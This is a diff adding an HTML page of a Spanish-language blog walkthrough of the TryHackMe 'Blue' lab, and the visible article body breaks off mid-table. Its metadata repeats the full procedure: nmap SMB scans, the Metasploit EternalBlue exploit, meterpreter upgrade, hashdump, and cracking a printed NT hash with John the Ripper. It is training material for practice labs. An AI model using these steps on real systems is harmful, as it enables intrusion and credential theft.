@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>Blue - TryHackMe</title>
+
+  <link rel="shortcut icon" href="/assets/images/favicon.ico">
+  <link rel="icon" href="/assets/iamges/favicon.ico" type="image/x-icon">
+  <link rel="icon" href="/assets/images/favicon.gif" type="image/gif">
+
+  <link rel="stylesheet" href="/assets/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Blue - TryHackMe | Filthy Hacker</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="Blue - TryHackMe" />
+<meta name="author" content="m4teo" />
+<meta property="og:locale" content="es" />
+<meta name="description" content="Hoy vamos a estar resolviendo la máquina Blue de TryHackMe. Esta es una máquina fácil tanto en la intrusión como en la escalada de privilegios, por lo que no supondrá ninguna complicación a la hora de realizarla. Ya por el nombre de la máquina, podemos darnos una idea de por donde van los tiros, ¿quizá EternalBlue? Fase De Reconocimiento Primeramente, vamos a utilizar la herramienta Nmap para determinar que puertos están abiertos, así como identificar la versión y servicios que corren en el activo. Para determinar que puertos están abiertos podemos realizar lo siguiente: nmap -p- --open -T5 -v -n &lt;dirección IP&gt; Y en caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa: sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn &lt;dirección IP&gt; A continuación se explican los parámetros utilizados en el escaneo de puertos con Nmap: Parámetro Explicación -p- Escanea todo el rango de puertos (65535 en total) --open Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos) -T5 La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, “generaremos más ruido”, pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos White Hat -v Verbose, reporta lo encontrado por consola -n No aplicar resolución DNS -sS Escaneo TCP SYN -min-rate Emitir paquetes no más lentos que &lt;valor&gt; por segundo -vvv Triple verbose, para obtener mayor información por consola -Pn No aplicar host discovery nmap -sC -sV -p 135,139,445,3389,49152,49153,49154,49158,49160 &lt;dirección IP&gt; A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con Nmap: Parámetro Explicación -sC Scripts básicos de enumeración -sV Versión y servicios que corren bajo los puertos encontrados -p Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior) Entre las preguntas que nos realiza la plataforma en esta primera fase, se encuentra: ¿Cuántos puertos están abiertos con un número de puerto inferior a 1000? ¿A qué es vulnerable esta máquina? Estas preguntas son bastante fáciles de responder si realizamos un buen escaneo con Nmap. Para responder a la primera pregunta no hay donde perderse, bastará con introducir cuántos puertos abiertos, inferiores a 1000, hemos detectado con nuestro escaneo; recordemos que existen en total 65535 puertos posibles. Para responder a la segunda pregunta, tendremos que realizar un escaneo adicional, ya que se nos pregunta, a que ataque es vulnerable la máquina; a modo de pista, la plataforma nos da un ejemplo de respuesta: ms08-067. Si recordamos, lo más relevante que encontramos con nuestro escaneo de versiones y servicios con Nmap, es el puerto 445, o protocolo SMB (Server Message Block). De modo que procederemos a utilizar los scripts específicos con los que cuenta Nmap, para detectar vulnerabilidades en dicho protocolo. Para poder utilizarlos podemos hacer lo siguiente: nmap --script=&quot;smb-vuln*&quot; -p 445 &lt;dirección IP&gt; A continuación se explican los parámetros utilizados en el escaneo de vulnerabilidades del protocolo SMB con Nmap: Parámetro Explicación --script Proporcionamos el script que queremos emplear; en este caso, como no teníamos un script en particular a utilizar, a través de expresiones regulares, indicamos que queremos utilizar todos aquellos scripts que comiencen por smb-vuln -p Especificamos a que puertos queremos aplicar este escaneo Como podemos darnos cuenta, esta máquina es vulnerable a MS17-010, o también conocido como EternalBlue. Fase De Explotación Para esta segunda fase, TryHackMe realiza la fase de explotación con el uso de Metasploit, no obstante, no recomiendo acostumbrarse a utilizar herramientas automatizadas, ya que perdemos bastante el control sobre lo que está pasando por detrás, de modo que no aprendemos; sin embargo, en esta máquina en concreto, no es posible realizar un procedimiento manual, ya que la máquina Blue, está pensada para ser explotada mediante el uso de Metasploit. Para hacer uso de Metasploit tendremos que abrir la aplicación, para ello haremos lo siguiente: msfconsole Una vez hemos abierto Metasploit, procederemos a buscar aquello que queremos explotar, en este caso, MS17-010, o EternalBlue, cualquiera de las dos formas es válida. search eternalblue search ms17-010 Posteriormente elegiremos el exploit a utilizar; de hecho, una de las preguntas de la plataforma justamente es, introducir el exploit que vamos a utilizar. use exploit/windows/smb/ms17_010_eternalblue Una vez hemos seleccionado el exploit, procederemos a configurar tanto el LHOST como el RHOST, que, dicho de otra forma, procederemos a introducir nuestra IP, y la IP de la máquina víctima. show options set LHOST &lt;nuestra IP&gt; set RHOST &lt;IP víctima&gt; Una vez hemos configurado dichos parámetros, bastará con empezar con el ataque, consiguiéndonos Metasploit una shell dentro de la máquina víctima. Una vez llegados a este punto, TryHackMe nos pide convertir nuestra shell actual, en meterpreter, para ello tendremos que abandonar nuestra sesión actual Ctrl + Z. Una vez fuera, tendremos que nuevamente buscar dentro de Metasploit, un módulo que nos permita pasar de una shell a meterpreter. search shell_to_meterpreter Una vez hemos encontrado un módulo que nos sirva, tendremos que utilizarlo. use post/multi/manage/shell_to_meterpreter Y al igual que antes, tendremos que configurar cierto parámetro para poder conseguir un meterpreter, en este caso, la sesión con la que estábamos trabajando antes. show options sessions set SESSION 1 run La opción sessions nos permite listar todas las sesiones que tengamos activas; esto es útil si tenemos más de una sesión activa, y necesitamos indicar una en particular. Una vez hemos conseguido un meterpreter, podemos volver a nuestra sesión. sessions 1 Escalada De Privilegios TryHackMe nos indica que a través del comando migrate &lt;ID del proceso&gt;, podemos convertirnos en el usuario que está corriendo dicho proceso, sin embargo, esto no tiene ningún sentido ya que somos de hecho un usuario con máximos privilegios, somos NT AUTHORITY\SYSTEM, de modo que no tiene sentido migrar al usuario que ya somos. Antes de pasar a conseguir las flags de la máquina, la plataforma nos sigue enseñando comandos útiles de Metasploit, en este caso el comando hashdump, con el cual podemos listar todos los usuarios del sistema, así como sus contraseñas hasheadas. En esta fase se nos pregunta por el nombre del usuario no predeterminado, es decir, aquel usuario que no sea Guest, o Administrator; finalmente, se nos pide crackear la contraseña de este usuario, para ello utilizaremos la herramienta John the Ripper, en conjunto del diccionario rockyou.txt. En caso de no contar con la herramienta John the Ripper instalada, podemos hacer lo siguiente: sudo apt install john En nuestra máquina, crearemos un documento de texto que contenga la contraseña hasheada del usuario, podemos hacerlo de manera manual, o desde la misma terminal: echo &quot;Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::&quot; &gt;&gt; nombreArchivo Una vez creado el archivo de texto, podemos pasar a crackear la contraseña: sudo john --format=NT --wordlist=/dirección/del/diccionario/rockyou.txt nombreArchivo Una vez hemos crackeado la contraseña que se nos solicitaba, podemos ahora si, pasar a buscar las respectivas flags. En este caso existe un total de 3 flags, las cuales, según indica la plataforma, están escondidas en ubicaciones claves de un sistema Windows, por lo que es aconsejable aprender estas locaciones. La primera flag dice que se encuentra en la raíz del sistema, dicho de otra forma, Disco Local C. Para poder navegar dentro de la máquina víctima, podríamos usar el mismo meterpreter, sin embargo, en este caso nos manejaremos a través de una shell, para ello ejecutaremos el comando shell. Una vez hecho esto, podemos ir hacia el directorio C:\\, listar su contenido y encontrar la flag. cd C:\\ dir type flag1.txt La segunda flag dice que se encuentra en una ubicación donde se almacenan las contraseñas dentro de Windows, dicho de otra forma, C:\Windows\System32\Config. cd C:\Windows\System32\Config dir type flag2.txt La última flag dice que se encuentra en una ubicación donde los administradores suelen tener guardadas cosas “bastante interesantes”, personalmente no tengo idea de donde podría ser esta ubicación así que procederemos a buscar el archivo flag3.txt, dentro de todo el sistema, para ello tendremos que ir a la raíz del sistema, y empezar a buscar desde ahí: cd \ dir flag3.txt /s /p Dudo mucho que los administradores guarden archivos importantes en una ubicación así, no obstante, es la plataforma la que nos comenta esto, y además, es aquí donde se encuentra la tercera y última flag, de modo que nos dirigiremos a esa ubicación para leer la flag. cd C:\Users\Jon\Documents dir type flag3.txt" />
+<meta property="og:description" content="Hoy vamos a estar resolviendo la máquina Blue de TryHackMe. Esta es una máquina fácil tanto en la intrusión como en la escalada de privilegios, por lo que no supondrá ninguna complicación a la hora de realizarla. Ya por el nombre de la máquina, podemos darnos una idea de por donde van los tiros, ¿quizá EternalBlue? Fase De Reconocimiento Primeramente, vamos a utilizar la herramienta Nmap para determinar que puertos están abiertos, así como identificar la versión y servicios que corren en el activo. Para determinar que puertos están abiertos podemos realizar lo siguiente: nmap -p- --open -T5 -v -n &lt;dirección IP&gt; Y en caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa: sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn &lt;dirección IP&gt; A continuación se explican los parámetros utilizados en el escaneo de puertos con Nmap: Parámetro Explicación -p- Escanea todo el rango de puertos (65535 en total) --open Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos) -T5 La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, “generaremos más ruido”, pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos White Hat -v Verbose, reporta lo encontrado por consola -n No aplicar resolución DNS -sS Escaneo TCP SYN -min-rate Emitir paquetes no más lentos que &lt;valor&gt; por segundo -vvv Triple verbose, para obtener mayor información por consola -Pn No aplicar host discovery nmap -sC -sV -p 135,139,445,3389,49152,49153,49154,49158,49160 &lt;dirección IP&gt; A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con Nmap: Parámetro Explicación -sC Scripts básicos de enumeración -sV Versión y servicios que corren bajo los puertos encontrados -p Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior) Entre las preguntas que nos realiza la plataforma en esta primera fase, se encuentra: ¿Cuántos puertos están abiertos con un número de puerto inferior a 1000? ¿A qué es vulnerable esta máquina? Estas preguntas son bastante fáciles de responder si realizamos un buen escaneo con Nmap. Para responder a la primera pregunta no hay donde perderse, bastará con introducir cuántos puertos abiertos, inferiores a 1000, hemos detectado con nuestro escaneo; recordemos que existen en total 65535 puertos posibles. Para responder a la segunda pregunta, tendremos que realizar un escaneo adicional, ya que se nos pregunta, a que ataque es vulnerable la máquina; a modo de pista, la plataforma nos da un ejemplo de respuesta: ms08-067. Si recordamos, lo más relevante que encontramos con nuestro escaneo de versiones y servicios con Nmap, es el puerto 445, o protocolo SMB (Server Message Block). De modo que procederemos a utilizar los scripts específicos con los que cuenta Nmap, para detectar vulnerabilidades en dicho protocolo. Para poder utilizarlos podemos hacer lo siguiente: nmap --script=&quot;smb-vuln*&quot; -p 445 &lt;dirección IP&gt; A continuación se explican los parámetros utilizados en el escaneo de vulnerabilidades del protocolo SMB con Nmap: Parámetro Explicación --script Proporcionamos el script que queremos emplear; en este caso, como no teníamos un script en particular a utilizar, a través de expresiones regulares, indicamos que queremos utilizar todos aquellos scripts que comiencen por smb-vuln -p Especificamos a que puertos queremos aplicar este escaneo Como podemos darnos cuenta, esta máquina es vulnerable a MS17-010, o también conocido como EternalBlue. Fase De Explotación Para esta segunda fase, TryHackMe realiza la fase de explotación con el uso de Metasploit, no obstante, no recomiendo acostumbrarse a utilizar herramientas automatizadas, ya que perdemos bastante el control sobre lo que está pasando por detrás, de modo que no aprendemos; sin embargo, en esta máquina en concreto, no es posible realizar un procedimiento manual, ya que la máquina Blue, está pensada para ser explotada mediante el uso de Metasploit. Para hacer uso de Metasploit tendremos que abrir la aplicación, para ello haremos lo siguiente: msfconsole Una vez hemos abierto Metasploit, procederemos a buscar aquello que queremos explotar, en este caso, MS17-010, o EternalBlue, cualquiera de las dos formas es válida. search eternalblue search ms17-010 Posteriormente elegiremos el exploit a utilizar; de hecho, una de las preguntas de la plataforma justamente es, introducir el exploit que vamos a utilizar. use exploit/windows/smb/ms17_010_eternalblue Una vez hemos seleccionado el exploit, procederemos a configurar tanto el LHOST como el RHOST, que, dicho de otra forma, procederemos a introducir nuestra IP, y la IP de la máquina víctima. show options set LHOST &lt;nuestra IP&gt; set RHOST &lt;IP víctima&gt; Una vez hemos configurado dichos parámetros, bastará con empezar con el ataque, consiguiéndonos Metasploit una shell dentro de la máquina víctima. Una vez llegados a este punto, TryHackMe nos pide convertir nuestra shell actual, en meterpreter, para ello tendremos que abandonar nuestra sesión actual Ctrl + Z. Una vez fuera, tendremos que nuevamente buscar dentro de Metasploit, un módulo que nos permita pasar de una shell a meterpreter. search shell_to_meterpreter Una vez hemos encontrado un módulo que nos sirva, tendremos que utilizarlo. use post/multi/manage/shell_to_meterpreter Y al igual que antes, tendremos que configurar cierto parámetro para poder conseguir un meterpreter, en este caso, la sesión con la que estábamos trabajando antes. show options sessions set SESSION 1 run La opción sessions nos permite listar todas las sesiones que tengamos activas; esto es útil si tenemos más de una sesión activa, y necesitamos indicar una en particular. Una vez hemos conseguido un meterpreter, podemos volver a nuestra sesión. sessions 1 Escalada De Privilegios TryHackMe nos indica que a través del comando migrate &lt;ID del proceso&gt;, podemos convertirnos en el usuario que está corriendo dicho proceso, sin embargo, esto no tiene ningún sentido ya que somos de hecho un usuario con máximos privilegios, somos NT AUTHORITY\SYSTEM, de modo que no tiene sentido migrar al usuario que ya somos. Antes de pasar a conseguir las flags de la máquina, la plataforma nos sigue enseñando comandos útiles de Metasploit, en este caso el comando hashdump, con el cual podemos listar todos los usuarios del sistema, así como sus contraseñas hasheadas. En esta fase se nos pregunta por el nombre del usuario no predeterminado, es decir, aquel usuario que no sea Guest, o Administrator; finalmente, se nos pide crackear la contraseña de este usuario, para ello utilizaremos la herramienta John the Ripper, en conjunto del diccionario rockyou.txt. En caso de no contar con la herramienta John the Ripper instalada, podemos hacer lo siguiente: sudo apt install john En nuestra máquina, crearemos un documento de texto que contenga la contraseña hasheada del usuario, podemos hacerlo de manera manual, o desde la misma terminal: echo &quot;Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::&quot; &gt;&gt; nombreArchivo Una vez creado el archivo de texto, podemos pasar a crackear la contraseña: sudo john --format=NT --wordlist=/dirección/del/diccionario/rockyou.txt nombreArchivo Una vez hemos crackeado la contraseña que se nos solicitaba, podemos ahora si, pasar a buscar las respectivas flags. En este caso existe un total de 3 flags, las cuales, según indica la plataforma, están escondidas en ubicaciones claves de un sistema Windows, por lo que es aconsejable aprender estas locaciones. La primera flag dice que se encuentra en la raíz del sistema, dicho de otra forma, Disco Local C. Para poder navegar dentro de la máquina víctima, podríamos usar el mismo meterpreter, sin embargo, en este caso nos manejaremos a través de una shell, para ello ejecutaremos el comando shell. Una vez hecho esto, podemos ir hacia el directorio C:\\, listar su contenido y encontrar la flag. cd C:\\ dir type flag1.txt La segunda flag dice que se encuentra en una ubicación donde se almacenan las contraseñas dentro de Windows, dicho de otra forma, C:\Windows\System32\Config. cd C:\Windows\System32\Config dir type flag2.txt La última flag dice que se encuentra en una ubicación donde los administradores suelen tener guardadas cosas “bastante interesantes”, personalmente no tengo idea de donde podría ser esta ubicación así que procederemos a buscar el archivo flag3.txt, dentro de todo el sistema, para ello tendremos que ir a la raíz del sistema, y empezar a buscar desde ahí: cd \ dir flag3.txt /s /p Dudo mucho que los administradores guarden archivos importantes en una ubicación así, no obstante, es la plataforma la que nos comenta esto, y además, es aquí donde se encuentra la tercera y última flag, de modo que nos dirigiremos a esa ubicación para leer la flag. cd C:\Users\Jon\Documents dir type flag3.txt" />
+<link rel="canonical" href="http://0.0.0.0:8000/es/Blue-TryHackMe/" />
+<meta property="og:url" content="http://0.0.0.0:8000/es/Blue-TryHackMe/" />
+<meta property="og:site_name" content="Filthy Hacker" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-11-15T00:00:00-05:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Blue - TryHackMe" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"m4teo","url":"https://mateonitro550.github.io"},"dateModified":"2021-11-15T00:00:00-05:00","datePublished":"2021-11-15T00:00:00-05:00","description":"Hoy vamos a estar resolviendo la máquina Blue de TryHackMe. Esta es una máquina fácil tanto en la intrusión como en la escalada de privilegios, por lo que no supondrá ninguna complicación a la hora de realizarla. Ya por el nombre de la máquina, podemos darnos una idea de por donde van los tiros, ¿quizá EternalBlue? Fase De Reconocimiento Primeramente, vamos a utilizar la herramienta Nmap para determinar que puertos están abiertos, así como identificar la versión y servicios que corren en el activo. Para determinar que puertos están abiertos podemos realizar lo siguiente: nmap -p- --open -T5 -v -n &lt;dirección IP&gt; Y en caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa: sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn &lt;dirección IP&gt; A continuación se explican los parámetros utilizados en el escaneo de puertos con Nmap: Parámetro Explicación -p- Escanea todo el rango de puertos (65535 en total) --open Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos) -T5 La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, “generaremos más ruido”, pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos White Hat -v Verbose, reporta lo encontrado por consola -n No aplicar resolución DNS -sS Escaneo TCP SYN -min-rate Emitir paquetes no más lentos que &lt;valor&gt; por segundo -vvv Triple verbose, para obtener mayor información por consola -Pn No aplicar host discovery nmap -sC -sV -p 135,139,445,3389,49152,49153,49154,49158,49160 &lt;dirección IP&gt; A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con Nmap: Parámetro Explicación -sC Scripts básicos de enumeración -sV Versión y servicios que corren bajo los puertos encontrados -p Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior) Entre las preguntas que nos realiza la plataforma en esta primera fase, se encuentra: ¿Cuántos puertos están abiertos con un número de puerto inferior a 1000? ¿A qué es vulnerable esta máquina? Estas preguntas son bastante fáciles de responder si realizamos un buen escaneo con Nmap. Para responder a la primera pregunta no hay donde perderse, bastará con introducir cuántos puertos abiertos, inferiores a 1000, hemos detectado con nuestro escaneo; recordemos que existen en total 65535 puertos posibles. Para responder a la segunda pregunta, tendremos que realizar un escaneo adicional, ya que se nos pregunta, a que ataque es vulnerable la máquina; a modo de pista, la plataforma nos da un ejemplo de respuesta: ms08-067. Si recordamos, lo más relevante que encontramos con nuestro escaneo de versiones y servicios con Nmap, es el puerto 445, o protocolo SMB (Server Message Block). De modo que procederemos a utilizar los scripts específicos con los que cuenta Nmap, para detectar vulnerabilidades en dicho protocolo. Para poder utilizarlos podemos hacer lo siguiente: nmap --script=&quot;smb-vuln*&quot; -p 445 &lt;dirección IP&gt; A continuación se explican los parámetros utilizados en el escaneo de vulnerabilidades del protocolo SMB con Nmap: Parámetro Explicación --script Proporcionamos el script que queremos emplear; en este caso, como no teníamos un script en particular a utilizar, a través de expresiones regulares, indicamos que queremos utilizar todos aquellos scripts que comiencen por smb-vuln -p Especificamos a que puertos queremos aplicar este escaneo Como podemos darnos cuenta, esta máquina es vulnerable a MS17-010, o también conocido como EternalBlue. Fase De Explotación Para esta segunda fase, TryHackMe realiza la fase de explotación con el uso de Metasploit, no obstante, no recomiendo acostumbrarse a utilizar herramientas automatizadas, ya que perdemos bastante el control sobre lo que está pasando por detrás, de modo que no aprendemos; sin embargo, en esta máquina en concreto, no es posible realizar un procedimiento manual, ya que la máquina Blue, está pensada para ser explotada mediante el uso de Metasploit. Para hacer uso de Metasploit tendremos que abrir la aplicación, para ello haremos lo siguiente: msfconsole Una vez hemos abierto Metasploit, procederemos a buscar aquello que queremos explotar, en este caso, MS17-010, o EternalBlue, cualquiera de las dos formas es válida. search eternalblue search ms17-010 Posteriormente elegiremos el exploit a utilizar; de hecho, una de las preguntas de la plataforma justamente es, introducir el exploit que vamos a utilizar. use exploit/windows/smb/ms17_010_eternalblue Una vez hemos seleccionado el exploit, procederemos a configurar tanto el LHOST como el RHOST, que, dicho de otra forma, procederemos a introducir nuestra IP, y la IP de la máquina víctima. show options set LHOST &lt;nuestra IP&gt; set RHOST &lt;IP víctima&gt; Una vez hemos configurado dichos parámetros, bastará con empezar con el ataque, consiguiéndonos Metasploit una shell dentro de la máquina víctima. Una vez llegados a este punto, TryHackMe nos pide convertir nuestra shell actual, en meterpreter, para ello tendremos que abandonar nuestra sesión actual Ctrl + Z. Una vez fuera, tendremos que nuevamente buscar dentro de Metasploit, un módulo que nos permita pasar de una shell a meterpreter. search shell_to_meterpreter Una vez hemos encontrado un módulo que nos sirva, tendremos que utilizarlo. use post/multi/manage/shell_to_meterpreter Y al igual que antes, tendremos que configurar cierto parámetro para poder conseguir un meterpreter, en este caso, la sesión con la que estábamos trabajando antes. show options sessions set SESSION 1 run La opción sessions nos permite listar todas las sesiones que tengamos activas; esto es útil si tenemos más de una sesión activa, y necesitamos indicar una en particular. Una vez hemos conseguido un meterpreter, podemos volver a nuestra sesión. sessions 1 Escalada De Privilegios TryHackMe nos indica que a través del comando migrate &lt;ID del proceso&gt;, podemos convertirnos en el usuario que está corriendo dicho proceso, sin embargo, esto no tiene ningún sentido ya que somos de hecho un usuario con máximos privilegios, somos NT AUTHORITY\\SYSTEM, de modo que no tiene sentido migrar al usuario que ya somos. Antes de pasar a conseguir las flags de la máquina, la plataforma nos sigue enseñando comandos útiles de Metasploit, en este caso el comando hashdump, con el cual podemos listar todos los usuarios del sistema, así como sus contraseñas hasheadas. En esta fase se nos pregunta por el nombre del usuario no predeterminado, es decir, aquel usuario que no sea Guest, o Administrator; finalmente, se nos pide crackear la contraseña de este usuario, para ello utilizaremos la herramienta John the Ripper, en conjunto del diccionario rockyou.txt. En caso de no contar con la herramienta John the Ripper instalada, podemos hacer lo siguiente: sudo apt install john En nuestra máquina, crearemos un documento de texto que contenga la contraseña hasheada del usuario, podemos hacerlo de manera manual, o desde la misma terminal: echo &quot;Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::&quot; &gt;&gt; nombreArchivo Una vez creado el archivo de texto, podemos pasar a crackear la contraseña: sudo john --format=NT --wordlist=/dirección/del/diccionario/rockyou.txt nombreArchivo Una vez hemos crackeado la contraseña que se nos solicitaba, podemos ahora si, pasar a buscar las respectivas flags. En este caso existe un total de 3 flags, las cuales, según indica la plataforma, están escondidas en ubicaciones claves de un sistema Windows, por lo que es aconsejable aprender estas locaciones. La primera flag dice que se encuentra en la raíz del sistema, dicho de otra forma, Disco Local C. Para poder navegar dentro de la máquina víctima, podríamos usar el mismo meterpreter, sin embargo, en este caso nos manejaremos a través de una shell, para ello ejecutaremos el comando shell. Una vez hecho esto, podemos ir hacia el directorio C:\\\\, listar su contenido y encontrar la flag. cd C:\\\\ dir type flag1.txt La segunda flag dice que se encuentra en una ubicación donde se almacenan las contraseñas dentro de Windows, dicho de otra forma, C:\\Windows\\System32\\Config. cd C:\\Windows\\System32\\Config dir type flag2.txt La última flag dice que se encuentra en una ubicación donde los administradores suelen tener guardadas cosas “bastante interesantes”, personalmente no tengo idea de donde podría ser esta ubicación así que procederemos a buscar el archivo flag3.txt, dentro de todo el sistema, para ello tendremos que ir a la raíz del sistema, y empezar a buscar desde ahí: cd \\ dir flag3.txt /s /p Dudo mucho que los administradores guarden archivos importantes en una ubicación así, no obstante, es la plataforma la que nos comenta esto, y además, es aquí donde se encuentra la tercera y última flag, de modo que nos dirigiremos a esa ubicación para leer la flag. cd C:\\Users\\Jon\\Documents dir type flag3.txt","headline":"Blue - TryHackMe","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:8000/es/Blue-TryHackMe/"},"url":"http://0.0.0.0:8000/es/Blue-TryHackMe/"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+  <!-- Google Tag Manager -->
+  <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+  new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+  j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+  'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+  })(window,document,'script','dataLayer','GTM-PPKV9V8T');</script>
+  <!-- End Google Tag Manager -->
+
+</head>
+
+
+
+<body>
+
+  <!-- Google Tag Manager (noscript) -->
+  <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PPKV9V8T"
+  height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+  <!-- End Google Tag Manager (noscript) -->
+
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1 class="glitch-header">filthyHacker@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/es"><h2 class="header-link">Publicaciones</h2></a>
+<a href="/es/search"><h2 class="header-link">Buscar</h2></a>
+<a href="/es/archive"><h2 class="header-link">Archivo</h2></a>
+<a href="/en"><h2 class="header-link">English</h2></a>
+
+    </div>
+  </div>
+</header>
+
+    <div class="container">
+      <section id="main_content">
+        <article>
+  <h2>Blue - TryHackMe</h2>
+  <time datetime="2021-11-15T00:00:00-05:00" class="by-line">
+    
+      15/11/2021
+    
+  </time>
+  <p>Hoy vamos a estar resolviendo la máquina <em>Blue</em> de <em>TryHackMe</em>. Esta es una máquina fácil tanto en la intrusión como en la escalada de privilegios, por lo que no supondrá ninguna complicación a la hora de realizarla.</p>
+
+<p>Ya por el nombre de la máquina, podemos darnos una idea de por donde van los tiros, ¿quizá <code class="language-plaintext highlighter-rouge">EternalBlue</code>?</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/1.png" alt="" /></p>
+
+<h3 id="fase-de-reconocimiento"><a href="#header-3"></a>Fase De Reconocimiento</h3>
+
+<p>Primeramente, vamos a utilizar la herramienta <em>Nmap</em> para determinar que puertos están abiertos, así como identificar la versión y servicios que corren en el activo. Para determinar que puertos están abiertos podemos realizar lo siguiente:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-T5</span> <span class="nt">-v</span> <span class="nt">-n</span> &lt;dirección IP&gt;
+</code></pre></div></div>
+
+<p>Y en caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> &lt;dirección IP&gt;
+</code></pre></div></div>
+
+<p>A continuación se explican los parámetros utilizados en el escaneo de puertos con <em>Nmap</em>:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Parámetro</th>
+      <th style="text-align: left">Explicación</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">-p-</td>
+      <td style="text-align: left">Escanea todo el rango de puertos (65535 en total)</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">--open</td>
+      <td style="text-align: left">Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos)</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-T5</td>
+      <td style="text-align: left">La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, “generaremos más ruido”, pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos <code class="language-plaintext highlighter-rouge">White Hat</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-v</td>
+      <td style="text-align: left"><em>Verbose</em>, reporta lo encontrado por consola</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-n</td>
+      <td style="text-align: left">No aplicar <em>resolución DNS</em></td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-sS</td>
+      <td style="text-align: left">Escaneo <em>TCP SYN</em></td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-min-rate</td>
+      <td style="text-align: left">Emitir paquetes no más lentos que &lt;valor&gt; por segundo</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-vvv</td>
+      <td style="text-align: left">Triple <em>verbose</em>, para obtener mayor información por consola</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-Pn</td>
+      <td style="text-align: left">No aplicar <em>host discovery</em></td>
+    </tr>
+  </tbody>
+</table>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p</span> 135,139,445,3389,49152,49153,49154,49158,49160 &lt;dirección IP&gt;
+</code></pre></div></div>
+
+<p>A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con <em>Nmap</em>:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Parámetro</th>
+      <th style="text-align: left">Explicación</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">-sC</td>
+      <td style="text-align: left">Scripts básicos de enumeración</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-sV</td>
+      <td style="text-align: left">Versión y servicios que corren bajo los puertos encontrados</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-p</td>
